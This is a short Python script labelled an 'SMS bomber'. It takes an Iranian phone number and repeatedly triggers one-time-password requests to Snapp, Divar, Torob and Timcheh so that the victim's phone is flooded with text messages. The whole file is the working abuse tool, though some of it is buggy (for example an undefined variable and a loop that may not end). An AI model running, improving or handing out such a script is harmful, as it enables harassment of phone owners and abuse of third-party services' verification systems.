#smsbomber
#arashm83
import requests,time
num=input('Phone number with out +98/0 = ')
data={'cellphone' : '+98'+num}
def snapp_code() :
    count = 0
    url_snapp ='https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
    respond = requests.get(url_snapp)
    if respond.status_code != 200 :
        print('error for snapp/',respond.status_code)
    while respond.status_code == 200 :
        while count != 5 :
            requests.post(url_snap,data={'cellphone' : '+98'+num})
            count += 1
            time.sleep(3)
            print('send')
            if count == 5 :
                break
def snapp_code2() :
    count = 0
    url_snapp ='https://api.snapp.ir/api/v1/sms/link'
    respond = requests.get(url_snapp)
    if respond.status_code != 200 :
        print('error for snapp/',respond.status_code)
    while respond.status_code == 200 :
        while count != 5 :
            requests.post(url_snap,data={'cellphone' : '+98'+num})
            count += 1
            time.sleep(3)
            print('send')
            if count == 5 :
                break


def divar_code() :
    count = 0
    url_divar = 'https://api.divar.ir/v5/auth/authenticate'
    respond=requests.get(url_divar)
    if respond.status_code != 200 :
        print('error for divar/',respond.status_code)
    while respond.status_code == 200 :
        while count != 5 :
            requests.post(url_divar,data={'cellphone' : '+98'+num})
            count += 1
            time.sleep(3)
            print('send')
            if count == 5 :
                break
            

def torob_code() :
    count = 0
    respond = requests.get('https://api.torob.com/a/phone/send-pin/?phone_number=0'+num)
    if respond.status_code != 200 :
        print('error for torob/',respond.status_code)
    while respond.status_code == 200 :
        requests.get('https://api.torob.com/a/phone/send-pin/?phone_number=0'+num)
        count += 1
        time.sleep(5)
        print('send')
        if count == 5 :
            break


def timcheh_code() :
    count = 0
    url_timcheh = 'https://api.timcheh.com/auth/otp/send'
    respond = requests.get(url_timcheh)
    if respond.status_code != 200 :
        print('error for timcheh/',respond.status_code)
    while respond.status_code == 200 :
        while count != 5 :
            requests.post(url_timcheh,data={'cellphone' : '+98'+num})
            count += 1
            time.sleep(3)
            print('send')
            if count == 5 :
                break


snapp_code()
divar_code()
torob_code()
timcheh_code()





